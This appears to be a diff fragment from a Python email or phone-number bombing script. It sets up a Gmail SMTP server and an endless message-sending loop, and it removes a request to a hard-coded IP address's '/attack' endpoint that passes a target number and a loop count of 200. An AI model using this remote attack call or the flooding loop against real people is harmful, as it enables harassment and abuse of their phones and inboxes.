@@ -76,8 +76,6 @@ def init():
 	'server':'smtp.gmail.com',
 	}
 	try:
-		   	if op == 1 or op == 4 or op ==5:
-		   		requests.get(f'http://144.217.235.227:3000/attack?number={numero}&loops=200')
 		   	while True:
 		   		##############################
 	   			msg = email.message.Message()
